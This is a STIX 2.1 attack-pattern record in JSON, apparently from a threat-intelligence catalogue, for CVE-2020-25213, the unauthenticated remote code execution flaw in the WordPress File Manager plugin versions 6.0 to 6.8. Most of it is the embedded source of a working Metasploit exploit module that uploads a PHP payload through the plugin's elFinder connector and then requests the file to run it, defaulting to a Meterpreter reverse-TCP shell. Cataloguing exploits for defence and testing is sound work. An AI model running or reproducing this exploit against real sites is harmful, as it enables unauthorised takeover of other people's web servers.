{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4511cf17-b5a4-4477-b9df-7bfaa998db08",
    "created": "2024-08-14T17:08:44.944496Z",
    "modified": "2024-08-14T17:08:44.9445Z",
    "name": "WordPress File Manager Unauthenticated Remote Code Execution",
    "description": " The File Manager (wp-file-manager) plugin from 6.0 to 6.8 for WordPress allows remote attackers to upload and execute arbitrary PHP code because it renames an unsafe example elFinder connector file to have the .php extension. This, for example, allows attackers to run the elFinder upload (or mkfile and put) command to write PHP code into the wp-content/plugins/wp-file-manager/lib/files/ directory.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/wp_file_manager_rce.rb",
            "external_id": "wp_file_manager_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/w4fz5uck5/wp-file-manager-0day"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/cve/CVE-2020-25213"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-25213"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress File Manager Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          The File Manager (wp-file-manager) plugin from 6.0 to 6.8 for WordPress allows remote attackers to upload and\n          execute arbitrary PHP code because it renames an unsafe example elFinder connector file to have the .php\n          extension. This, for example, allows attackers to run the elFinder upload (or mkfile and put) command to write\n          PHP code into the wp-content/plugins/wp-file-manager/lib/files/ directory.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Alex Souza (w4fz5uck5)', # initial discovery and PoC\n          'Imran E. Dawoodjee <imran [at] threathounds.com>', # msf module\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/w4fz5uck5/wp-file-manager-0day' ],\n          [ 'URL', 'https://www.tenable.com/cve/CVE-2020-25213' ],\n          [ 'CVE', '2020-25213' ]\n        ],\n        'Platform' => [ 'php' ],\n        'Privileged' => false,\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          [\n            'WordPress File Manager 6.0-6.8',\n            {\n              'DefaultOptions' => { 'PAYLOAD' => 'php/meterpreter/reverse_tcp' }\n            }\n          ]\n        ],\n        'DisclosureDate' => '2020-09-09', # disclosure date on NVD, PoC was published on August 26 2020\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'Base path to WordPress installation', '/']),\n        OptEnum.new('COMMAND', [true, 'elFinder commands used to exploit the vulnerability', 'upload', %w[upload mkfile+put]])\n      ]\n    )\n  end\n\n  def check\n    return CheckCode::Unknown unless wordpress_and_online?\n\n    # check the plugin version from readme\n    check_plugin_version_from_readme('wp-file-manager', '6.9', '6.0')\n  end\n\n  def exploit\n    # base path to File Manager plugin\n    file_manager_base_uri = normalize_uri(target_uri.path, 'wp-content', 'plugins', 'wp-file-manager')\n    # filename of the file to be uploaded/created\n    filename = \"#{Rex::Text.rand_text_alphanumeric(6)}.php\"\n    register_file_for_cleanup(filename)\n\n    case datastore['COMMAND']\n    when 'upload'\n      elfinder_post(file_manager_base_uri, 'upload', 'payload' => payload.encoded, 'filename' => filename)\n    when 'mkfile+put'\n      elfinder_post(file_manager_base_uri, 'mkfile', 'filename' => filename)\n      elfinder_post(file_manager_base_uri, 'put', 'payload' => payload.encoded, 'filename' => filename)\n    end\n\n    payload_uri = normalize_uri(file_manager_base_uri, 'lib', 'files', filename)\n    print_status(\"#{peer} - Payload is at #{payload_uri}\")\n    # execute the payload\n    send_request_cgi('uri' => normalize_uri(payload_uri))\n  end\n\n  # make it easier to switch between \"upload\" and \"mkfile+put\" exploit methods\n  def elfinder_post(file_manager_base_uri, elfinder_cmd, opts = {})\n    filename = opts['filename']\n\n    # prep for exploit\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(elfinder_cmd, nil, nil, 'form-data; name=\"cmd\"')\n\n    case elfinder_cmd\n    when 'upload'\n      post_data.add_part('l1_', nil, nil, 'form-data; name=\"target\"')\n      post_data.add_part(payload.encoded, 'application/octet-stream', nil, \"form-data; name=\\\"upload[]\\\"; filename=\\\"#{filename}\\\"\")\n    when 'mkfile'\n      post_data.add_part('l1_', nil, nil, 'form-data; name=\"target\"')\n      post_data.add_part(filename, nil, nil, 'form-data; name=\"name\"')\n    when 'put'\n      post_data.add_part(\"l1_#{Rex::Text.encode_base64(filename)}\", nil, nil, 'form-data; name=\"target\"')\n      post_data.add_part(payload.encoded, nil, nil, 'form-data; name=\"content\"')\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(file_manager_base_uri, 'lib', 'php', 'connector.minimal.php'),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s\n    )\n\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect\") unless res\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected HTTP response code: #{res.code}\") unless res.code == 200\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-09-09, # disclosure date on NVD, PoC was published on August 26 2020",
    "x_mitre_platforms": [
        "[ 'php' ]"
    ]
}